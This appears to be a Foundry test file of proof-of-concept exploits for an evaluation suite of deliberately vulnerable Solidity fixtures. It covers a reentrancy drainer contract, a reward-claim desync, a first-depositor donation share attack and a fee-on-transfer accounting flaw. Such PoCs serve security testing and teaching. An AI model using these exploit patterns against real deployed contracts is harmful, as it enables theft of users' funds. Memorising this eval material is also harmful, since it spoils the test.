// SPDX-License-Identifier: MIT
// Eval PoCs — one test per PoC-able fixture. Run: forge test -vv
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {V01_ReentrancyVault} from "../src/V01_ReentrancyVault.sol";
import {V02_ClaimDesync} from "../src/V02_ClaimDesync.sol";
import {V03_DonationShares} from "../src/V03_DonationShares.sol";
import {V08_FeeOnTransfer} from "../src/V08_FeeOnTransfer.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {MockFeeToken} from "../src/MockFeeToken.sol";

contract Attacker01 {
    V01_ReentrancyVault vault;
    uint256 public drained;
    constructor(V01_ReentrancyVault v) payable { vault = v; }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }
    receive() external payable {
        drained += msg.value;
        if (address(vault).balance >= 1 ether) vault.withdrawAll();
    }
}

contract EvalPoCs is Test {
    function test_V01_reentrancy() public {
        // victim deposits 10 eth; attacker deposits 1 and drains the vault
        V01_ReentrancyVault vault = new V01_ReentrancyVault();
        vm.deal(address(this), 20 ether);
        vault.deposit{value: 10 ether}();
        Attacker01 a = new Attacker01{value: 1 ether}(vault);
        a.attack{value: 1 ether}();
        assertEq(address(vault).balance, 0, "vault drained");
        assertEq(a.drained(), 11 ether, "attacker extracted 11 eth from 1");
    }

    function test_V02_claimDesync() public {
        MockERC20 tok = new MockERC20();
        V02_ClaimDesync c = new V02_ClaimDesync(address(tok));
        tok.mint(address(this), 300e18);
        tok.approve(address(c), type(uint256).max);
        c.addReward(address(0xA), 100e18);
        c.addReward(address(0xB), 100e18);
        vm.prank(address(0xA));
        c.claim(); // pays pro-rata: 200 * 100 / 200 = 100 (fair)
        vm.prank(address(0xB));
        c.claim(); // BUG: pays 100 * 100 / 200 = 50 instead of 100
        assertEq(tok.balanceOf(address(0xA)), 100e18);
        assertEq(tok.balanceOf(address(0xB)), 50e18, "B underpaid by 50");
        assertEq(tok.balanceOf(address(c)), 50e18, "remainder permanently locked");
    }

    function test_V03_donationShares() public {
        MockERC20 tok = new MockERC20();
        V03_DonationShares v = new V03_DonationShares(address(tok));
        tok.mint(address(this), 3000e18);
        tok.approve(address(v), type(uint256).max);
        // attacker: deposit 1 wei, donate 1000e18 directly
        v.deposit(1);
        tok.transfer(address(v), 1000e18);
        // victim: deposit 1000e18 -> shares = 1000e18 * 1 / (1000e18+1) = 0
        address victim = address(0x1234);
        tok.mint(victim, 1000e18);
        vm.startPrank(victim);
        tok.approve(address(v), type(uint256).max);
        v.deposit(1000e18);
        vm.stopPrank();
        assertEq(v.shares(victim), 0, "victim minted 0 shares for 1000e18 deposit");
        assertEq(tok.balanceOf(victim), 0, "victim's deposit taken");
    }

    function test_V08_feeOnTransfer() public {
        MockFeeToken tok = new MockFeeToken();
        V08_FeeOnTransfer v = new V08_FeeOnTransfer(address(tok));
        tok.mint(address(this), 100e18);
        tok.approve(address(v), type(uint256).max);
        // deposit 100, credited 100, received 99
        v.deposit(100e18);
        assertEq(tok.balanceOf(address(v)), 99e18, "vault actually holds 99");
        assertEq(v.credits(address(this)), 100e18, "but credits 100");
        // withdraw 99 -> 1 token stolen from later depositors (inflation)
        v.withdraw(99e18);
        assertEq(v.credits(address(this)), 1e18, "1 credit remains but vault empty");
        assertEq(tok.balanceOf(address(v)), 0, "vault insolvent");
    }
}
